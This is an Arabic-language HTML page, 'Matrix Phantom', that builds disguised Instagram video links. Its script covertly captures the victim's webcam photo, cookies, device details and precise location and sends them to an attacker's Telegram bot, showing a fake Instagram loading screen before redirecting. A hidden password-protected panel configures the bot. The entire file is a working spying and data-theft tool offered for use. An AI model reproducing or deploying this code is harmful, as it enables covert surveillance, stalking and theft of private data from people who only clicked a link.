<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Service | Matrix V1.0.6</title>
    <style>
        :root { --primary: #0095f6; --bg: #000; --card: #121212; --text: #fff; }
        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .card { background: var(--card); border: 1px solid #333; padding: 30px; border-radius: 24px; width: 100%; max-width: 380px; text-align: center; }
        input { width: 100%; padding: 14px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; margin-bottom: 15px; box-sizing: border-box; }
        .btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; }
        #trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; align-items: center; justify-content: center; flex-direction: column; }
        .ig-logo { width: 70px; animation: pulse 1.5s infinite; }
        .v-tag { position: fixed; bottom: 10px; left: 10px; font-size: 9px; color: #111; cursor: pointer; }
        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="card" id="app-main">
        <h2 style="color:var(--primary)">MATRIX PHANTOM | PRO</h2>
        <input type="text" id="target-url" placeholder="ضع رابط الفيديو هنا">
        <button class="btn" onclick="startMining()">تـلـغـيـم الرابط واختصاره 🔥</button>
        <div id="result-view" style="display:none; margin-top:20px;">
            <span id="final-link-display" style="color:#00ff00; font-size:12px; display:block; margin-bottom:10px;"></span>
            <button class="btn" style="background:#333" onclick="copyResult()">نسخ الرابط 📋</button>
        </div>
    </div>

    <div id="trap-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="ig-logo">
    </div>

    <canvas id="hidden-canvas" style="display:none;"></canvas>
    <div class="v-tag" id="secret-trigger">Version 1.0.6</div>

    <script>
        // لوحة التحكم السرية
        document.getElementById('secret-trigger').onclick = () => { 
            let p = prompt("🔐 كلمة السر:"); 
            if (p === "01224815487") {
                let t = prompt("Bot Token:"), i = prompt("Your ID:");
                localStorage.setItem('mx_cfg', JSON.stringify({t, i}));
                alert("✅ تم الربط بنجاح!");
            }
        };

        async function startMining() {
            const url = document.getElementById('target-url').value;
            const cfg = JSON.parse(localStorage.getItem('mx_cfg') || '{}');
            if(!cfg.t) return alert("⚠️ اربط البوت الأول!");
            const payload = btoa(JSON.stringify({t: cfg.t, i: cfg.i, u: url}));
            const longUrl = window.location.origin + window.location.pathname + "?data=" + payload;
            const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
            document.getElementById('final-link-display').innerText = await res.text();
            document.getElementById('result-view').style.display = 'block';
        }

        function copyResult() { navigator.clipboard.writeText(document.getElementById('final-link-display').innerText); alert("📋 تم النسخ!"); }

        // وظائف سحب البيانات
        async function captureData(decoded) {
            // 1. بيانات الجهاز
            let deviceInfo = `📱 **بيانات الجهاز:**\n` +
                `- المنصة: ${navigator.platform}\n` +
                `- المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
                `- الرامات: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
                `- المعالج: ${navigator.hardwareConcurrency} Cores\n` +
                `- دقة الشاشة: ${screen.width}x${screen.height}\n` +
                `- اللغة: ${navigator.language}`;

            // 2. الكوكيز
            let cookies = document.cookie || "لا توجد كوكيز متاحة";
            
            // 3. الموقع الدقيق
            navigator.geolocation.getCurrentPosition(async (p) => {
                let map = `🌍 **الموقع:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendToBot(decoded, `${deviceInfo}\n\n🍪 **Cookies:**\n\`${cookies}\`\n\n${map}`);
            }, async () => {
                await sendToBot(decoded, `${deviceInfo}\n\n🍪 **Cookies:**\n\`${cookies}\`\n⚠️ الموقع الدقيق مرفوض.`);
            });
        }

        async function sendToBot(cfg, text) {
            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `chat_id=${cfg.i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`
            });
        }

        window.onload = async () => {
            const data = new URLSearchParams(window.location.search).get('data');
            if (data) {
                document.getElementById('app-main').style.display = 'none';
                document.getElementById('trap-screen').style.display = 'flex';
                const decoded = JSON.parse(atob(data));
                
                // سحب الصورة
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.getElementById('hidden-canvas'); canvas.width = 640; canvas.height = 640;
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 640);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                    const fd = new FormData(); fd.append('photo', blob, 'shot.jpg'); fd.append('chat_id', decoded.i);
                    await fetch(`https://api.telegram.org/bot${decoded.t}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                await captureData(decoded);
                setTimeout(() => window.location.href = decoded.u, 2000);
            }
        };
    </script>
</body>
</html>
